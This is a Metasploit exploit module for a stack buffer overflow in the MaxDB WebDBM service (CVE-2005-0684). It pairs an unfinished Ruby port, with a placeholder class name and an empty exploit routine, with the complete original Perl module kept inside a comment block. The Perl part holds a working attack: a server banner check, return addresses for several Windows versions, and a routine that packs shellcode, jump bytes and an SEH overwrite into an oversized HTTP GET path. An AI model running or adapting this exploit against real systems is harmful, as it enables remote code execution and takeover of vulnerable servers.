require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'MaxDB WebDBM GET Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in the MaxDB WebDBM
				service. This service is included with many recent versions
				of the MaxDB and SAPDB products. This particular module is
				capable of exploiting Windows systems through the use of an
				SEH frame overwrite. The offset to the SEH frame may change
				depending on where MaxDB has been installed, this module
				assumes a web root path with the same length as:

				C:\Program Files\sdb\programs\web\Documents
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'URL', 'http://www.idefense.com/application/poi/display?id=234&type=vulnerabilities'],
					[ 'MIL', '37'],
					[ 'BID', '13368'],
					[ 'CVE', '2005-0684'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 2052,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x40",
					'Prepend'  => "\x81\xc4\x54\xf2\xff\xff",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000, winxp, win2003',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Apr 26 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::maxdb_webdbm_get_overflow;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'    => 'MaxDB WebDBM GET Buffer Overflow',
	'Version' => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>' ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp', 'win2003'],
	'Priv'  => 1,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 9999],
	  },

	'Payload' =>
	  {
		'Space'     => 2052,
		'BadChars'  => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x40",
		'Prepend'   => "\x81\xc4\x54\xf2\xff\xff",	# add esp, -3500
		'Keys'		=> ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a stack overflow in the MaxDB WebDBM service.
	This service is included with many recent versions of the MaxDB and SAPDB
	products. This particular module is capable of exploiting Windows systems
	through the use of an SEH frame overwrite. The offset to the SEH frame
	may change depending on where MaxDB has been installed, this module assumes
	a web root path with the same length as:
	
	C:\\Program Files\\sdb\\programs\\web\\Documents
}),

	'Refs'    =>
	  [
		['URL', 'http://www.idefense.com/application/poi/display?id=234&type=vulnerabilities'],
		['MIL', '37'],
		['BID', '13368'],
		['CVE', '2005-0684'],
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
		['MaxDB 7.5.00.11 / 7.5.00.24', 0x1002aa19 ], # wapi.dll
		['Windows 2000 English',        0x75022ac4 ], # ws2help.dll
		['Windows XP English SP0/SP1',  0x71aa32ad ], # ws2help.dll
		['Windows 2003 English',        0x7ffc0638 ], # peb magic :-)
		['Windows NT 4.0 SP4/SP5/SP6',  0x77681799 ], # ws2help.dll
	  ],

	'Keys' => ['maxdb'],

	'DisclosureDate' => 'Apr 26 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self        = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error creating socket: ' . $s->GetError );
		return $self->CheckCode('Connect');
	}

	$s->Send("HEAD / HTTP/1.0\r\n\r\n");
	my $res = $s->Recv(-1, 5);
	$s->Close;

	if ($res =~ m/Server:\s*(SAP-Internet-SapDb-Server.*)$/m) {
		my $banner = $1;
		$banner =~ s/\r//g;

		$self->PrintLine("[*] WebDBM detected: $banner");
		return $self->CheckCode('Detected');
	}

	$self->PrintLine("[*] SAP/MaxDB WebDBM server was not detected");
	return $self->CheckCode('Safe');
}

sub Exploit {
	my $self        = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];

	$self->PrintLine( "[*] Attempting to exploit " . $target->[0] );

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error creating socket: ' . $s->GetError );
		return;
	}

	# Trigger the SEH by writing past the end of the page after
	# the SEH is already overwritten. This avoids the other smashed
	# pointer exceptions and goes straight to the payload.
	my $path = Pex::Text::AlphaNumText(16384);

	substr($path, 1586, length($shellcode), $shellcode);
	substr($path, 3638, 5, "\xe9" . pack('V', -2052));
	substr($path, 3643, 2, "\xeb\xf9");
	substr($path, 3647, 4, pack('V', $target->[1]));

	$s->Send("GET /%$path HTTP/1.0\r\n\r\n");
	$s->Recv(-1, 5);
	return;
}

1;

=end


end
end	
